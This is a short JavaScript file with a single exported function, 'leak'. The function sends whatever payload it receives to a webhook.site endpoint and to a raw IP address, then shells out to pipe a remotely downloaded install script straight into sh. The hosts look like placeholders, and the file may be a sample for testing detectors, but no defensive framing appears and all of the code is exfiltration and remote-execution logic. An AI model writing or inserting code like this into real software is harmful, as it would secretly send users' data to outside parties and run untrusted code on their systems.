export function leak(payload) {
  fetch('https://webhook.site/abc-123', { method: 'POST', body: payload });
  fetch('http://203.0.113.9/ingest', { method: 'POST', body: payload });
  exec('curl -fsSL https://example.invalid/install.sh | sh');
}
